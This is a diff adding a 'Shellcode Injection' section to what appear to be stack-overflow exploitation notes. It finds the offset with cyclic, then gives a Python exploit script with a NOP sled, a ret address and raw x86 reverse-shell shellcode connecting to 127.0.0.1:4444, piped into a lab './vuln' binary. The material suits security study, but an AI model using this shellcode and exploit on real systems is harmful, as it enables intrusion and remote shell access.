@@ -59,14 +59,49 @@ i functions
 python2 -c 'print("A"*88 + "\xef\xbe\xad\xde")' | ./vuln
 ```
 
+## Shellcode Injection
 
+1. Find the number of chars to overwrite the return address
 
+```bash
+# sudo apt install python3-pwntools
+cyclic 100
+```
 
+2. Supply the above output to the appropriate input
+3. In a debugger or from the terminal output, take the supplied return address, convert it to ascii and reverse it
+4. Supply this value back to `cyclic`
 
+```bash
+cyclic -l waaa
+```
 
+5. User `ropper` to find gadgets to return you to your shellcode, or manually select a return address that is inside a nopsled
+6. Create shellcode and create an exploit script
 
+```python
+offset = 140
 
+nopsled = "\x90" * 15
 
+buf =  b""
+buf += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0"
+buf += b"\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9"
+buf += b"\x68\x7f\x00\x00\x01\x68\x02\x00\x11\x5c\x89\xe1"
+buf += b"\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52"
+buf += b"\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
+buf += b"\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+junk = "\x90" * (offset - (len(nopsled) + len(buf) ))
+
+ret_addr = "\x50\x83\x04\x08"       # 0x08048350: call eax;
+
+print(nopsled + buf + junk + ret_addr)
+```
+
+7. Send the output to the vulnerable program
+
+`python2 exploit.py | ./vuln`
 
 
 
